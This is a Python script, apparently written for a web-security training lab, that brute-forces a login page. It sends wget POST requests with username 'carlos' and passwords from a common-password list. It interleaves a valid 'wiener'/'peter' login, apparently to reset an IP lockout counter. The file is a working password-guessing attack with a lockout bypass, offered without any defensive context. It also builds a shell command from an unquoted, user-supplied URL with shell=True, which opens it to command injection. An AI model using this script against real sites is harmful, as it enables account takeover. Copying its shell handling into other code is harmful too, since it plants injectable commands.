import subprocess

def run_wget(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output, error

def main():
    pass_list = [
        "123456", "password", "mustang", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop",
        "123321", "12345678", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000",
        "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
        "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey",
        "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111",
        "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger",
        "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew",
        "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
        "monitoring", "montana", "moon", "moscow"
    ]

    login_url = input("Enter the login URL: ")

    for index, password in enumerate(pass_list):
        if index % 2 == 0:
            username = "carlos"
        else:
            username = "wiener"
            password = "peter"

        command = f"wget --quiet --server-response --post-data='username={username}&password={password}' {login_url} 2>&1 | awk '/^  HTTP/{{print $2}}'"
        output, error = run_wget(command)

        try:
            response_code = output.decode().strip()
            print(f"Attempt with username: {username}, password: {password}, Response Code: {response_code}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
